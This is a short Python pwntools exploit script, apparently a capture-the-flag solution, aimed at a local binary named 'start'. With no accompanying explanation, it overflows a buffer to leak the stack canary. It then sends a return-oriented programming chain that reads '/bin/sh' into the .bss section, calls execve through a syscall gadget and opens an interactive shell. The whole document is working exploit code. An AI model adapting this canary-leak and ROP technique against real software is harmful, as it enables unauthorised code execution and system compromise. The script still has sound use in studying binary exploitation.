#!/usr/bin/python
from pwn import *

p = process("./start")
elf = ELF("./start")
pop_rdi = 0x4005d5
pop_rsi = 0x4017f7
pop_rdx = 0x443776
pop_rax_rdx_rbx = 0x47a6e6
binsh = "/bin/sh\x00"
syscall = 0x4003fc
read = 0x440300
bss = elf.bss()

# canary leak
pay = 'A'*0x18
pay += 'B'

p.send(pay)

p.recvuntil('B')
canary = u64("\x00" + p.recv(7))

# read(0, bss, len(binsh))
pay = 'A'*0x18
pay += p64(canary)
pay += p64(0) # SFP
pay += p64(pop_rdi) + p64(0)
pay += p64(pop_rsi) + p64(bss)
pay += p64(pop_rdx) + p64(len(binsh))
pay += p64(read)
# execve("/bin/sh", NULL, NULL)
pay += p64(pop_rax_rdx_rbx) + p64(0x3b) + p64(0) + p64(0)
pay += p64(pop_rsi) + p64(0)
pay += p64(pop_rdi) + p64(bss)
pay += p64(syscall)

p.send(pay)
p.sendline("exit")
p.send(binsh)

p.interactive()





